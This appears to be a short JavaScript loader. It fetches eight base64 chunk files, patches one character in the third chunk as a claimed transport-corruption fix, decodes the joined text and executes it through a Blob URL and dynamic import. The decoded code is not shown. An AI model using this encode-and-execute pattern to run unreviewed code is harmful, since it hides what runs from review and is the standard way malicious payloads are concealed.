const parts = [
  './chunks/b64-0a.txt',
  './chunks/b64-0b.txt',
  './chunks/b64-0c.txt',
  './chunks/b64-0d.txt',
  './chunks/b64-1a.txt',
  './chunks/b64-1b.txt',
  './chunks/b64-1c.txt',
  './chunks/b64-1d.txt',
];
const texts = await Promise.all(parts.map((u) => fetch(u).then((r) => {
  if (!r.ok) throw new Error('failed ' + u);
  return r.text();
})));
// one-byte MCP transport corruption fix in b64-0c
texts[2] = texts[2].slice(0, 776) + 'v' + texts[2].slice(777);
const code = atob(texts.join(''));
const url = URL.createObjectURL(new Blob([code], { type: 'text/javascript' }));
await import(url);
